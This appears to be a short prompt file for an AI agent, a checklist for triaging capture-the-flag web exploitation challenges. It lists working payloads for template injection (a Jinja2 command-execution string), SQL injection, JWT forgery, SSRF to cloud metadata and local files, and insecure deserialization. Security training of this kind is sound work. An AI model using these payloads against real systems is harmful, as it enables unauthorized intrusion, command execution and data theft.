---
description: Web exploitation triage, injection testing, and vulnerability payloads.
---

Analyze a web exploitation challenge.

### Diagnostic Checklist
1. **Source / Git Inspection**: Look for `.git/`, `.env`, hardcoded secrets, route handlers.
2. **SSTI Check**: Test `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`.
   - Jinja2 payload: `{{ config.__class__.__init__.__globals__['os'].popen('cat flag*').read() }}`
3. **SQL Injection**: Test `' OR '1'='1' --`, `' UNION SELECT NULL, NULL --`.
4. **JWT**: Check `"alg": "none"`, weak secret brute-force with `hashcat -m 16500`, RS256->HS256 key confusion.
5. **SSRF**: Test `169.254.169.254`, `0x7f000001`, `127.1`, `file:///etc/passwd`, `gopher://`.
6. **Deserialization**: Python `pickle`, Node.js `node-serialize`, PHP `unserialize()`.
